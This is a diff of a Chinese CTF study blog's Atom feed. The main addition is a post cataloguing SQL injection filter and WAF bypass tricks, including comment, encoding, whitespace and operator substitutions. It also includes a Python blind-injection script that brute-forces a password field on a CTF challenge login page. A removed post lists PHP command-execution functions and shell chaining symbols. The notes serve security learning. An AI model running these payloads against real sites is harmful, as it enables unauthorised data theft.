@@ -6,7 +6,7 @@
   <link href="https://tin10g.github.io/atom.xml" rel="self"/>
   
   <link href="https://tin10g.github.io/"/>
-  <updated>2024-10-22T11:37:35.185Z</updated>
+  <updated>2024-10-23T12:31:51.889Z</updated>
   <id>https://tin10g.github.io/</id>
   
   <author>
@@ -17,9 +17,37 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>SQL过滤绕过</title>
+    <link href="https://tin10g.github.io/2024/10/23/2024web-SQL%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/"/>
+    <id>https://tin10g.github.io/2024/10/23/2024web-SQL%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/</id>
+    <published>2024-10-23T10:37:09.694Z</published>
+    <updated>2024-10-23T12:31:51.889Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><h2 id="注释类型"><a href="#注释类型" class="headerlink" title="注释类型"></a>注释类型</h2><ul><li>– 注释内容</li><li>#注释内容（<code>%23</code>即是#）</li><li>&#x2F;* 注释内容 *&#x2F;</li></ul><h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><p>其是<code>/*注释内容*/</code>的变体，标准格式为<code>/*!代码*/</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="comment">/*!from*/</span> emails;</span><br><span class="line"># 上面的语句等价于<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> emails;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> emails <span class="keyword">WHERE</span> email_id<span class="operator">=</span><span class="number">5</span> <span class="keyword">UNION</span> <span class="comment">/*!select*/</span> <span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"># 上面的语句等价于<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> emails <span class="keyword">WHERE</span> email_id<span class="operator">=</span><span class="number">5</span> <span class="keyword">UNION</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>;</span><br></pre></td></tr></table></figure><h1 id="大小写过滤"><a href="#大小写过滤" class="headerlink" title="大小写过滤"></a>大小写过滤</h1><p>当WAF将如<code>select</code>过滤掉，我们使用<code>SELECT</code>也可能成功绕过WAF的过滤实现注入</p><h1 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h1><p>WAF会进行匹配关键词如<code>select</code>，如果匹配成功就进行将关键词删除，我们可以构造<code>selselectect</code>这样这个单词中间的<code>select</code>剩余字母就又拼接成<code>select</code>从而实现注入<strong>（这种情况适合条件很苛刻）</strong></p><h1 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h1><p>有的题目不能输入逗号，输入就会过滤</p><p>union select 1,2 </p><p>&#x3D;&gt; union select * from (select 1) a join (select 2) </p><h1 id="from绕过"><a href="#from绕过" class="headerlink" title="from绕过"></a>from绕过</h1><p>输入<code>from</code>之后就会没有返回信息，或者出现其它异常的情况，其就是<code>from</code>处于黑名单，此时要绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 此种方法通常要配合python的暴力破解，下面有脚本(通常还需要配合布尔注入)</span><br><span class="line">select * from user where passwd like &#x27;a%&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BoolCrash:</span><br><span class="line">    def __init__(self, url, subject):</span><br><span class="line">        self.subject = subject</span><br><span class="line">        self.url = url</span><br><span class="line">        self.list = list(&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;)</span><br><span class="line">        self.empty = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            for i in self.list:</span><br><span class="line">                # 下面3行需要自行构造</span><br><span class="line">                sql_payloads = f&quot;1&#x27; OR p3ss_w0rd like &#x27;&#123;self.empty + i&#125;%&#x27; #&quot;</span><br><span class="line">                params = &#123;&#x27;username&#x27;: sql_payloads, &#x27;password&#x27;: &#x27;1&#x27;&#125;</span><br><span class="line">                response = requests.post(url=self.url, data=params)</span><br><span class="line">                response = response.text</span><br><span class="line">                # 布尔注入判断的条件</span><br><span class="line">                if self.subject in response:</span><br><span class="line">                    self.empty = self.empty + i</span><br><span class="line">                    break</span><br><span class="line">            # 当下一个内容不再出现在列表里面时，代表下一个内容为其它内容或为空，循环结束</span><br><span class="line">            else:</span><br><span class="line">                print(&#x27;当前碰撞结束，结果可能因为list内容的局限而失败&#x27;)</span><br><span class="line">                break</span><br><span class="line">            print(self.empty)</span><br><span class="line"></span><br><span class="line">BoolCrash(&#x27;http://eci-2ze9oa2p12vc9plzmnyh.cloudeci1.ichunqiu.com/Challenges/login.php&#x27;,&#x27;密码错误&#x27;).run()</span><br></pre></td></tr></table></figure><h1 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h1><h2 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM emails WHERE email_id=0x737475706964406468616b6b616e2e6c6f63616c;</span><br><span class="line">-- 上面表示查询email_id=stupid@dhakkan.local的信息，其中注意，16进制编码需要0x开头</span><br><span class="line">-- 后面跟字符串对应的16进制编码</span><br></pre></td></tr></table></figure><h2 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM emails WHERE email_id=CHAR(115, 116, 117, 112, 105, 100, 64, 100, 104, 97, 107, 107, 97, 110, 46, 108, 111, 99, 97, 108);</span><br><span class="line">-- 上面表示查询email_id=stupid@dhakkan.local的信息</span><br><span class="line">-- 可以用hackbar的SQL MYSQL-CHAR快速编写出类似格式的内容</span><br></pre></td></tr></table></figure><h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><h2 id=""><a href="#" class="headerlink" title="&#x2F;**&#x2F;"></a>&#x2F;**&#x2F;</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT/**/*/**/FROM/**/course;</span><br><span class="line">=&gt;</span><br><span class="line">SELECT * FROM course;</span><br></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title="()"></a>()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- ()括号内不能写*</span><br><span class="line">-- 括号包裹的内容一般不能是select from where这种关键词</span><br><span class="line">SELECT(Cno)FROM(course);</span><br><span class="line">等价于</span><br><span class="line">SELECT Cno FROM course;</span><br></pre></td></tr></table></figure><h2 id="回车"><a href="#回车" class="headerlink" title="回车"></a>回车</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- ()括号内不能写*</span><br><span class="line">-- 括号包裹的内容一般不能是select from where这种关键词</span><br><span class="line">SELECT(Cno)FROM(course);</span><br><span class="line">等价于</span><br><span class="line">SELECT Cno FROM course;</span><br></pre></td></tr></table></figure><h2 id="-2"><a href="#-2" class="headerlink" title="&#96;"></a>&#96;</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 注意`是反引号并非&#x27;单引号</span><br><span class="line">-- 反引号包裹的内容一般不能是select from where这种关键词</span><br><span class="line">SELECT`Cno`FROM`course`;</span><br></pre></td></tr></table></figure><h2 id="Tab"><a href="#Tab" class="headerlink" title="Tab"></a>Tab</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- Tab类似于输入空格但其同空格并不相同</span><br><span class="line">-- Tab的URL编码%09(在浏览器栏输入时适用)</span><br><span class="line">SELECT  CnoFROMcourse;</span><br></pre></td></tr></table></figure><h1 id="同义过滤"><a href="#同义过滤" class="headerlink" title="同义过滤"></a>同义过滤</h1><h2 id="普通同义"><a href="#普通同义" class="headerlink" title="普通同义"></a>普通同义</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 同义 &amp;&amp;</span><br><span class="line">or 同义 ||</span><br><span class="line">xor 同义 |</span><br><span class="line">not 同义 !</span><br><span class="line">= 同义 like regexp rlike</span><br><span class="line">!= 同义 &lt;&gt;</span><br><span class="line">&#x27; 同义 十六进制</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT Cno FROM course WHERE Cno=1 &amp;&amp; Cpno=5;</span><br><span class="line">SELECT Cno FROM course WHERE Cno=1 || Cpno=5;</span><br><span class="line">SELECT Cno FROM course WHERE Cno=1 | Cpno=5;</span><br><span class="line">SELECT Cno FROM course WHERE Cno!=1;</span><br><span class="line">SELECT Cno FROM course WHERE Cno like 1;</span><br><span class="line">SELECT Cno FROM course WHERE Cno&lt;&gt;1;</span><br></pre></td></tr></table></figure><h2 id="函数同义"><a href="#函数同义" class="headerlink" title="函数同义"></a>函数同义</h2><h3 id="或"><a href="#或" class="headerlink" title="&gt;或&lt;(greatest、least)"></a><code>&gt;</code>或<code>&lt;</code>(greatest、least)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;或&lt; 等价于 greatest(n1, n2, n3…) least(n1, n2, n3…)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- greatest返回参数当中的最大值，这就类似于适用大于小于号的效果</span><br><span class="line">-- least返回参数当中的最小值，这就类似于适用大于小于号的效果</span><br><span class="line">SELECT * FROM course WHERE Cno=9 AND GREATEST(ASCII(SUBSTR(Cname,1,1)),1)=106;</span><br></pre></td></tr></table></figure><h3 id="strcmp、between"><a href="#strcmp、between" class="headerlink" title="=(strcmp、between)"></a><code>=</code>(strcmp、between)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">= 等价于 strcmp(s1, s2) </span><br><span class="line">= 等价于 between ... and ...</span><br><span class="line">= 等价于 like</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- strcmp用来对比s1与s2两个字符串，当s1与s2完全相同时返回0</span><br><span class="line">SELECT * FROM course WHERE Cno=9 AND STRCMP(&#x27;1&#x27;,&#x27;1&#x27;)=0;</span><br><span class="line">SELECT * FROM course WHERE Cno=9 AND SUBSTR(Cname,1,1) BETWEEN &#x27;j&#x27; AND &#x27;j&#x27;; -- 查看Cname中第一个字符是不是等于&#x27;j&#x27;</span><br></pre></td></tr></table></figure><h3 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 适用于类似substr函数(sql盲注时使用)</span><br><span class="line">SELECT * FROM course WHERE Cno=9 AND SUBSTR(Cname,1,1) BETWEEN &#x27;j&#x27; AND &#x27;j&#x27;;</span><br><span class="line">等价于</span><br><span class="line">SELECT * FROM course WHERE Cno=9 AND SUBSTR(Cname FROM 1 FOR 1) BETWEEN &#x27;j&#x27; AND &#x27;j&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 适用于并列条件时(联合注入)</span><br><span class="line">SELECT * FROM course WHERE Cno=9 UNION SELECT 1,2,3,4;</span><br><span class="line">等价于</span><br><span class="line">SELECT * FROM course WHERE Cno=9 UNION SELECT * FROM (SELECT 1)a JOIN  (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 适用于并列条件时(联合注入)</span><br><span class="line">SELECT * FROM course WHERE Cno=9 UNION SELECT 1,2,3,4;</span><br><span class="line">等价于</span><br><span class="line">SELECT * FROM course WHERE Cno=9 UNION SELECT * FROM (SELECT 1)a JOIN  (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d;</span><br></pre></td></tr></table></figure><h1 id="函数过滤"><a href="#函数过滤" class="headerlink" title="函数过滤"></a>函数过滤</h1><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h2><p>替代函数：<code>benchmark()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 1 AND SLEEP(1);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 1 AND BENCHMARK(1000000000,1);</span><br><span class="line">MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</span><br></pre></td></tr></table></figure><h2 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h2><p>替代函数：<code>hex()</code>、<code>bin()</code>、<code>conv()</code>、<code>ord()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM course WHERE Cno=9 AND ASCII(SUBSTR(Cname,1,1))=106;</span><br><span class="line">等价于</span><br><span class="line">SELECT * FROM course WHERE Cno=9 AND CONV(HEX(SUBSTR(Cname,1,1)),16,10)=106;</span><br><span class="line">-- CONV(&#x27;FF&#x27;, 16, 10); 将’FF‘从16进制转换为10进制</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ORD(&#x27;a&#x27;); -- ord 只是在处理中文的时候同ascii有区别</span><br><span class="line">SELECT ASCII(&#x27;a&#x27;);</span><br></pre></td></tr></table></figure><h2 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h2><p>替代函数：<code>concat_ws()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(1,2,3); -- 123</span><br><span class="line">SELECT CONCAT_WS(&#x27;,&#x27;,1,2,3); -- 1,2,3</span><br></pre></td></tr></table></figure><h2 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h2><p>替代函数：<code>substring</code> <code>()mid()</code> <code>left()</code> <code>right()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT SUBSTR(&#x27;abcdef&#x27;,1,2); -- ab</span><br><span class="line">SELECT SUBSTRING(&#x27;abcdef&#x27;,1,2);-- ab</span><br><span class="line">SELECT MID(&#x27;abcdef&#x27;,1,2);-- ab</span><br><span class="line">SELECT LEFT(&#x27;abcdef&#x27;,2);-- ab</span><br><span class="line">SELECT RIGHT(&#x27;abcdef&#x27;,2);-- ef</span><br></pre></td></tr></table></figure><h2 id="长度限制无法全输出"><a href="#长度限制无法全输出" class="headerlink" title="长度限制无法全输出"></a>长度限制无法全输出</h2><h3 id="right"><a href="#right" class="headerlink" title="right()"></a>right()</h3><p>使用：搜索只出现一段开头。可能是因为长度限制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RIGHT(product_name, 4) last_4_characters</span><br></pre></td></tr></table></figure><h3 id="mid"><a href="#mid" class="headerlink" title="mid()"></a>mid()</h3><p>使用只出现一段开头。可能是因为长度限制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT MID(column_name,start[,length]) FROM table_name</span><br></pre></td></tr></table></figure><h1 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT+Cno-1+1.from course;</span><br><span class="line">等价于</span><br><span class="line">SELECT Cno FROM course;</span><br><span class="line">-- +是用于字符串连接的，‛-‛和‛.‛ 在此也用于连接，可以逃过空格和关键字过滤</span><br></pre></td></tr></table></figure><h1 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select insert update delete</span><br><span class="line">替代此时考虑是否存在堆叠注入</span><br><span class="line">-- 查数据库 show database;</span><br><span class="line">-- 查表 show tables;</span><br><span class="line">-- 查列 show columns from table;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;注释&quot;&gt;&lt;a href=&quot;#注释&quot; class=&quot;headerlink&quot; title=&quot;注释&quot;&gt;&lt;/a&gt;注释&lt;/h1&gt;&lt;h2 id=&quot;注释类型&quot;&gt;&lt;a href=&quot;#注释类型&quot; class=&quot;headerlink&quot; title=&quot;注释类型&quot;&gt;&lt;/a&gt;注释类型&lt;/h</summary>
+      
+    
+    
+    
+    <category term="Web - 2024笔记" scheme="https://tin10g.github.io/categories/Web-2024%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="Web" scheme="https://tin10g.github.io/tags/Web/"/>
+    
+    <category term="CTF" scheme="https://tin10g.github.io/tags/CTF/"/>
+    
+    <category term="SQL" scheme="https://tin10g.github.io/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Sqlmap</title>
-    <link href="https://tin10g.github.io/2024/10/22/Sqlmap/"/>
-    <id>https://tin10g.github.io/2024/10/22/Sqlmap/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-Sqlmap/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-Sqlmap/</id>
     <published>2024-10-22T12:11:50.540Z</published>
     <updated>2024-10-22T11:37:35.185Z</updated>
     
@@ -44,8 +72,8 @@
   
   <entry>
     <title>SQL-Lab做题记录</title>
-    <link href="https://tin10g.github.io/2024/10/22/SQL-Lab/"/>
-    <id>https://tin10g.github.io/2024/10/22/SQL-Lab/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2024web-SQL-Lab/"/>
+    <id>https://tin10g.github.io/2024/10/22/2024web-SQL-Lab/</id>
     <published>2024-10-22T12:11:50.537Z</published>
     <updated>2024-10-22T08:12:52.791Z</updated>
     
@@ -75,8 +103,8 @@
   
   <entry>
     <title>SQL · alter&amp;show&amp;SQL约束</title>
-    <link href="https://tin10g.github.io/2024/10/22/SQL%20%C2%B7%20alter&amp;show&amp;SQL%E7%BA%A6%E6%9D%9F%20/"/>
-    <id>https://tin10g.github.io/2024/10/22/SQL%20%C2%B7%20alter&amp;show&amp;SQL%E7%BA%A6%E6%9D%9F%20/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-SQL%20%C2%B7%20alter&amp;show&amp;SQL%E7%BA%A6%E6%9D%9F%20/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-SQL%20%C2%B7%20alter&amp;show&amp;SQL%E7%BA%A6%E6%9D%9F%20/</id>
     <published>2024-10-22T12:11:33.080Z</published>
     <updated>2024-10-22T11:37:30.792Z</updated>
     
@@ -102,8 +130,8 @@
   
   <entry>
     <title>常见PHP魔术方法</title>
-    <link href="https://tin10g.github.io/2024/10/22/%E5%B8%B8%E8%A7%81PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
-    <id>https://tin10g.github.io/2024/10/22/%E5%B8%B8%E8%A7%81PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-%E5%B8%B8%E8%A7%81PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-%E5%B8%B8%E8%A7%81PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</id>
     <published>2024-10-22T12:11:01.295Z</published>
     <updated>2024-10-22T11:33:44.043Z</updated>
     
@@ -130,8 +158,8 @@
   
   <entry>
     <title>布尔盲注</title>
-    <link href="https://tin10g.github.io/2024/10/22/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
-    <id>https://tin10g.github.io/2024/10/22/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
     <published>2024-10-22T12:11:01.293Z</published>
     <updated>2024-10-22T11:33:41.046Z</updated>
     
@@ -157,8 +185,8 @@
   
   <entry>
     <title>不包含数字or字母or特殊字符的RCE</title>
-    <link href="https://tin10g.github.io/2024/10/22/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97or%E5%AD%97%E6%AF%8Dor%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84RCE/"/>
-    <id>https://tin10g.github.io/2024/10/22/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97or%E5%AD%97%E6%AF%8Dor%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84RCE/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97or%E5%AD%97%E6%AF%8Dor%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84RCE/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97or%E5%AD%97%E6%AF%8Dor%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84RCE/</id>
     <published>2024-10-22T12:11:01.291Z</published>
     <updated>2024-10-22T11:33:35.620Z</updated>
     
@@ -185,8 +213,8 @@
   
   <entry>
     <title>报错注入</title>
-    <link href="https://tin10g.github.io/2024/10/22/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%20/"/>
-    <id>https://tin10g.github.io/2024/10/22/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%20/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%20/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%20/</id>
     <published>2024-10-22T12:11:01.286Z</published>
     <updated>2024-10-22T11:33:29.441Z</updated>
     
@@ -405,8 +433,8 @@
   
   <entry>
     <title>绝对路径拼接漏洞</title>
-    <link href="https://tin10g.github.io/2024/10/22/%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E6%8B%BC%E6%8E%A5%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://tin10g.github.io/2024/10/22/%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E6%8B%BC%E6%8E%A5%E6%BC%8F%E6%B4%9E/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E6%8B%BC%E6%8E%A5%E6%BC%8F%E6%B4%9E/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E6%8B%BC%E6%8E%A5%E6%BC%8F%E6%B4%9E/</id>
     <published>2024-10-22T12:10:41.721Z</published>
     <updated>2024-10-22T11:33:56.296Z</updated>
     
@@ -432,8 +460,8 @@
   
   <entry>
     <title>nmap</title>
-    <link href="https://tin10g.github.io/2024/10/22/nmap/"/>
-    <id>https://tin10g.github.io/2024/10/22/nmap/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-nmap/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-nmap/</id>
     <published>2024-10-22T12:09:56.068Z</published>
     <updated>2024-10-22T11:35:47.868Z</updated>
     
@@ -459,8 +487,8 @@
   
   <entry>
     <title>msfvenom生成远控木马</title>
-    <link href="https://tin10g.github.io/2024/10/22/msfvenom%E7%94%9F%E6%88%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/"/>
-    <id>https://tin10g.github.io/2024/10/22/msfvenom%E7%94%9F%E6%88%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-msfvenom%E7%94%9F%E6%88%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-msfvenom%E7%94%9F%E6%88%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/</id>
     <published>2024-10-22T12:09:56.066Z</published>
     <updated>2024-10-22T11:35:45.326Z</updated>
     
@@ -485,8 +513,8 @@
   
   <entry>
     <title>MD5绕过&amp;sha1碰撞</title>
-    <link href="https://tin10g.github.io/2024/10/22/MD5%E7%BB%95%E8%BF%87&amp;sha1%E7%A2%B0%E6%92%9E/"/>
-    <id>https://tin10g.github.io/2024/10/22/MD5%E7%BB%95%E8%BF%87&amp;sha1%E7%A2%B0%E6%92%9E/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-MD5%E7%BB%95%E8%BF%87&amp;sha1%E7%A2%B0%E6%92%9E/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-MD5%E7%BB%95%E8%BF%87&amp;sha1%E7%A2%B0%E6%92%9E/</id>
     <published>2024-10-22T12:09:56.064Z</published>
     <updated>2024-10-22T12:00:00.294Z</updated>
     
@@ -512,8 +540,8 @@
   
   <entry>
     <title>kali之metasploit</title>
-    <link href="https://tin10g.github.io/2024/10/22/kali%E4%B9%8Bmetasploit/"/>
-    <id>https://tin10g.github.io/2024/10/22/kali%E4%B9%8Bmetasploit/</id>
+    <link href="https://tin10g.github.io/2024/10/22/2023web-kali%E4%B9%8Bmetasploit/"/>
+    <id>https://tin10g.github.io/2024/10/22/2023web-kali%E4%B9%8Bmetasploit/</id>
     <published>2024-10-22T12:09:56.062Z</published>
     <updated>2024-10-22T11:34:33.529Z</updated>
     
@@ -523,33 +551,6 @@
       
       
     <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;//启动&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo su&lt;/span&gt;&lt;br&gt;</summary>
-      
-    
-    
-    
-    <category term="Web - 2023笔记（未整理）" scheme="https://tin10g.github.io/categories/Web-2023%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%AA%E6%95%B4%E7%90%86%EF%BC%89/"/>
-    
-    
-    <category term="Web" scheme="https://tin10g.github.io/tags/Web/"/>
-    
-    <category term="CTF" scheme="https://tin10g.github.io/tags/CTF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>RCE1</title>
-    <link href="https://tin10g.github.io/2024/10/22/RCE/"/>
-    <id>https://tin10g.github.io/2024/10/22/RCE/</id>
-    <published>2024-10-22T12:09:56.060Z</published>
-    <updated>2024-10-22T11:37:19.284Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><p>参考文章：<br><a href="https://blog.csdn.net/qq_63844103/article/details/126953630">【web安全】——命令执行漏洞（RCE）详解</a><br><a href="https://blog.csdn.net/weixin_46706771/article/details/119008895?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169383565116800184198616%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169383565116800184198616&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-119008895-null-null.142%5Ev93%5Econtrol&utm_term=rce&spm=1018.2226.3001.4187">RCE总结</a></p></blockquote><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><ul><li>代码层过滤不严<br>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&quot;/bin/program --arg $arg&quot;);</span><br></pre></td></tr></table></figure></li><li>系统的漏洞造成命令注入<br>比如：bash破壳漏洞</li><li>调用的第三方组件存在代码执行漏洞<br> 如：wordPress中用来处理图片的imageMagick组件、JAVA中的命令执行漏洞（struts2&#x2F;ElasticsearchGroovy等）、ThinkPHP5.x的命令执行</li></ul><h2 id="PHP可能存在命令执行漏洞的函数"><a href="#PHP可能存在命令执行漏洞的函数" class="headerlink" title="PHP可能存在命令执行漏洞的函数"></a>PHP可能存在命令执行漏洞的函数</h2><p><strong>利用系统函数实现命令执行的函数</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval（）、assert（）、preg_replace（）、call_user_func（）</span><br></pre></td></tr></table></figure><p>如果页面中存在以上这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞，除此以外还有其他函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ob_start（）、unserialize（）、creat_function（） 、usort（）、uasort（）、uksort（）、 array_filter（）、 array_reduce（）、 array_map（）</span><br></pre></td></tr></table></figure><p><strong>直接执行系统命令的代码函数</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system（），exec（），shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（），反引号</span><br></pre></td></tr></table></figure><h2 id="命令拼接符号"><a href="#命令拼接符号" class="headerlink" title="命令拼接符号"></a>命令拼接符号</h2><ul><li>Windows<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;  A&amp;B无论A是false还是true，B都执行，即互不影响</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;  A&amp;&amp;B具有短路效果，A是false，B就不执行，有短路效果</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|  